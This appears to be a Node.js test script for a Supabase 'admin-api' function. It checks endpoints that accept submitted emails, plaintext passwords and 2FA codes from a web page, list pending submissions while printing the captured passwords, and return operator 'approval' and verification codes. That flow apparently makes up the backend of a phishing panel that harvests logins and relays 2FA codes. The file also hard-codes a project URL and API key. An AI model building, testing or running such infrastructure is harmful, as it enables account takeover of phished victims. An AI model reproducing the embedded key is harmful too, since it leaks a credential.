// SIMPLE ADMIN-API TEST
console.log('🚀 TESTING ADMIN-API FUNCTION...\n');

const SUPABASE_URL = 'https://nqsdardermkzppeaazbb.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc';

const headers = {
    'Authorization': `Bearer ${ANON_KEY}`,
    'apikey': ANON_KEY,
    'Content-Type': 'application/json'
};

// Test 1: Root endpoint  
async function testRoot() {
    console.log('1️⃣ Testing ROOT endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/`, {
            headers: headers
        });
        
        console.log('✅ ROOT Status:', response.status);
        
        if (response.ok) {
            const data = await response.text();
            console.log('📋 Response:', data.substring(0, 100) + '...');
            return true;
        } else {
            console.log('❌ ROOT failed with status:', response.status);
            return false;
        }
    } catch (error) {
        console.log('❌ ROOT Error:', error.message);
        return false;
    }
}

// Test 2: Submit request
async function testSubmit() {
    console.log('\n2️⃣ Testing SUBMIT REQUEST endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                email: 'test@example.com',
                password: 'testpass123',
                twofa: '',
                userAgent: 'Node.js Test',
                currentPage: 'index.html'
            })
        });
        
        console.log('✅ SUBMIT Status:', response.status);
        
        if (response.ok) {
            const data = await response.json();
            console.log('📝 Request ID:', data.requestId);
            return data.requestId;
        } else {
            const errorText = await response.text();
            console.log('❌ SUBMIT failed:', errorText);
            return null;
        }
    } catch (error) {
        console.log('❌ SUBMIT Error:', error.message);
        return null;
    }
}

// Test 3: Get pending requests
async function testPending() {
    console.log('\n3️⃣ Testing PENDING REQUESTS endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, {
            headers: headers
        });
        
        console.log('✅ PENDING Status:', response.status);
        
        if (response.ok) {
            const data = await response.json();
            console.log('📊 Total Requests:', data.length);
            
            if (data.length > 0) {
                console.log('📧 Latest Email:', data[0].email);
                console.log('🔐 Latest Password:', data[0].password);
                console.log('📱 Latest Status:', data[0].status);
            }
            return data;
        } else {
            const errorText = await response.text();
            console.log('❌ PENDING failed:', errorText);
            return [];
        }
    } catch (error) {
        console.log('❌ PENDING Error:', error.message);
        return [];
    }
}

// Test 4: Check approval
async function testCheckApproval() {
    console.log('\n4️⃣ Testing CHECK APPROVAL endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/check-approval?email=test@example.com`, {
            headers: headers
        });
        
        console.log('✅ CHECK APPROVAL Status:', response.status);
        
        if (response.ok) {
            const data = await response.json();
            console.log('📋 Approval Status:', data.status);
            console.log('🔢 Verification Code:', data.verificationCode || 'None');
            console.log('🆔 Request ID:', data.id || 'None');
            return data;
        } else {
            const errorText = await response.text();
            console.log('❌ CHECK APPROVAL failed:', errorText);
            return null;
        }
    } catch (error) {
        console.log('❌ CHECK APPROVAL Error:', error.message);
        return null;
    }
}

// Run all tests
async function runTests() {
    console.log('🎯 ADMIN-API COMPREHENSIVE TEST');
    console.log('🔗 Base URL:', SUPABASE_URL);
    console.log('🔑 Function: admin-api');
    console.log('='.repeat(50));
    
    const rootOk = await testRoot();
    const requestId = await testSubmit();
    const pendingData = await testPending();
    const approvalData = await testCheckApproval();
    
    console.log('\n' + '='.repeat(50));
    console.log('📊 TEST SUMMARY:');
    console.log('✅ Root Endpoint:', rootOk ? 'PASS' : 'FAIL');
    console.log('✅ Submit Request:', requestId ? 'PASS' : 'FAIL');
    console.log('✅ Pending Requests:', Array.isArray(pendingData) ? 'PASS' : 'FAIL');
    console.log('✅ Check Approval:', approvalData ? 'PASS' : 'FAIL');
    
    const passCount = [rootOk, !!requestId, Array.isArray(pendingData), !!approvalData].filter(Boolean).length;
    console.log(`\n🏆 FINAL SCORE: ${passCount}/4 tests passed`);
    
    if (passCount === 4) {
        console.log('🎉 ALL TESTS PASSED! Admin-API is fully functional! 🚀');
    } else if (passCount >= 2) {
        console.log('⚠️ Some tests failed but API is partially working.');
    } else {
        console.log('❌ API is not working properly. Check Supabase function deployment.');
    }
}

// Execute tests
runTests().catch(console.error); 